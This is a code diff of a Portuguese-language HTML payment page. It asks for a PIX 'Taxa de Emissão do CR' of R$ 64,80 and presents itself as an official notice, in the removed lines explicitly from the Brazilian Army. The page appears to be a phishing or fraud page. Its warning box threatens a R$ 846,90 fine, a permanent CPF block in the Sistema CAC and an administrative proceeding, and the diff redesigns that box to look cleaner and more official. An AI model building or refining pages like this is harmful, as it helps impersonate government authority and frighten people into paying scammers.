@@ -14,41 +14,63 @@ body {
 <main class="container mx-auto px-4 py-8" style="background-color: #fff; min-height: 100vh;">
     <div class="max-w-lg mx-auto bg-white p-8 rounded-lg shadow-lg border border-gray-200">
         
-        <!-- Status do Pagamento -->
-        <div style="background: linear-gradient(135deg, #1e3a2f 0%, #2d5a3d 100%); color: white; padding: 12px; border-radius: 6px; text-align: center; margin-bottom: 16px;">
-            <div style="display: inline-block; width: 16px; height: 16px; border: 2px solid #ffd700; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 6px;"></div>
-            <p style="margin: 0; font-size: 13px; font-weight: 600; letter-spacing: 0.5px;">AGUARDANDO PAGAMENTO</p>
+        <!-- Status Simples -->
+        <div style="text-align: center; margin-bottom: 20px; padding: 16px; background: #f8f9fa; border-left: 4px solid #007bff; border-radius: 4px;">
+            <div style="display: inline-block; width: 18px; height: 18px; border: 2px solid #007bff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px;"></div>
+            <span style="color: #495057; font-size: 14px; font-weight: 500;">Aguardando pagamento...</span>
         </div>
         
-        <!-- Cabeçalho -->
-        <div style="text-align: center; margin-bottom: 16px;">
-            <i class="fas fa-shield-alt" style="font-size: 18px; color: #2d5a3d; margin-bottom: 6px;"></i>
-            <h2 style="font-size: 18px; font-weight: 700; color: #2d5a3d; margin: 0 0 4px 0;">PAGAMENTO PIX</h2>
-            <p style="color: #495057; margin: 0; font-size: 13px;">Taxa de Emissão do CR</p>
-            <div style="margin-top: 8px; padding: 8px 16px; background: #f8f9fa; border: 2px solid #2d5a3d; border-radius: 4px; display: inline-block;">
-                <p style="font-size: 24px; font-weight: 800; color: #2d5a3d; margin: 0; font-family: 'Courier New', monospace;">R$ 64,80</p>
+        <!-- Título Principal -->
+        <div style="text-align: center; margin-bottom: 24px;">
+            <h2 style="font-size: 20px; font-weight: 600; color: #343a40; margin: 0 0 8px 0;">PAGAMENTO PIX</h2>
+            <p style="color: #6c757d; margin: 0 0 12px 0; font-size: 14px;">Taxa de Emissão do Certificado de Registro</p>
+            <div style="display: inline-block; padding: 12px 24px; background: white; border: 2px solid #28a745; border-radius: 6px;">
+                <span style="font-size: 28px; font-weight: 700; color: #28a745;">R$ 64,80</span>
             </div>
         </div>
 
-        <!-- Aviso Obrigatório -->
-        <div style="margin-bottom: 16px; border: 1px solid #dc3545; border-radius: 4px; overflow: hidden;">
-            <div style="background: #dc3545; color: white; padding: 8px 12px; text-align: center;">
-                <i class="fas fa-exclamation-triangle" style="margin-right: 6px; font-size: 12px;"></i>
-                <strong style="font-size: 11px; letter-spacing: 0.3px;">AVISO OFICIAL - EXÉRCITO BRASILEIRO</strong>
+        <!-- Aviso Clean e Profissional -->
+        <div style="margin-bottom: 24px; background: white; border: 1px solid #e9ecef; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+            
+            <!-- Header do aviso -->
+            <div style="background: #dc3545; color: white; padding: 12px 16px; text-align: center;">
+                <strong style="font-size: 13px; font-weight: 600;">⚠️ COMUNICADO OFICIAL</strong>
             </div>
             
-            <div style="padding: 12px; background: #f8f9fa;">
-                <p style="color: #495057; font-size: 11px; line-height: 1.4; margin: 0 0 8px 0;">
-                    <strong>ATENÇÃO:</strong> Pagamento obrigatório conforme regulamentação do Exército Brasileiro.
+            <!-- Conteúdo principal -->
+            <div style="padding: 20px;">
+                <h3 style="color: #dc3545; font-size: 16px; font-weight: 600; margin: 0 0 16px 0; text-align: center;">
+                    PAGAMENTO OBRIGATÓRIO
+                </h3>
+                
+                <p style="color: #495057; font-size: 13px; line-height: 1.6; margin: 0 0 16px 0; text-align: center;">
+                    Este pagamento é <strong>obrigatório</strong> por lei. O não cumprimento resultará em sanções administrativas.
                 </p>
                 
-                <div style="background: #fff5f5; padding: 8px; border-radius: 3px; border-left: 3px solid #dc3545;">
-                    <p style="color: #dc3545; font-size: 10px; font-weight: 600; margin: 0 0 4px 0;">CONSEQUÊNCIAS:</p>
-                    <ul style="color: #7f1d1d; font-size: 10px; margin: 0; padding-left: 12px; line-height: 1.3;">
-                        <li>Multa: <strong>R$ 846,90</strong></li>
-                        <li>Bloqueio do CPF no Sistema CAC</li>
-                        <li>Impossibilidade de novos registros</li>
-                    </ul>
+                <!-- Consequências em tabela clean -->
+                <div style="background: #f8f9fa; border-radius: 6px; padding: 16px;">
+                    <h4 style="color: #dc3545; font-size: 14px; font-weight: 600; margin: 0 0 12px 0; text-align: center;">
+                        Em caso de não pagamento:
+                    </h4>
+                    
+                    <div style="space-y: 8px;">
+                        <div style="display: flex; align-items: center; padding: 8px 0; border-bottom: 1px solid #e9ecef;">
+                            <span style="color: #dc3545; margin-right: 8px;">●</span>
+                            <span style="color: #495057; font-size: 12px;">Multa administrativa de <strong>R$ 846,90</strong></span>
+                        </div>
+                        <div style="display: flex; align-items: center; padding: 8px 0; border-bottom: 1px solid #e9ecef;">
+                            <span style="color: #dc3545; margin-right: 8px;">●</span>
+                            <span style="color: #495057; font-size: 12px;">Bloqueio permanente do CPF no Sistema CAC</span>
+                        </div>
+                        <div style="display: flex; align-items: center; padding: 8px 0; border-bottom: 1px solid #e9ecef;">
+                            <span style="color: #dc3545; margin-right: 8px;">●</span>
+                            <span style="color: #495057; font-size: 12px;">Impossibilidade de novos registros militares</span>
+                        </div>
+                        <div style="display: flex; align-items: center; padding: 8px 0;">
+                            <span style="color: #dc3545; margin-right: 8px;">●</span>
+                            <span style="color: #495057; font-size: 12px;">Abertura de processo administrativo</span>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
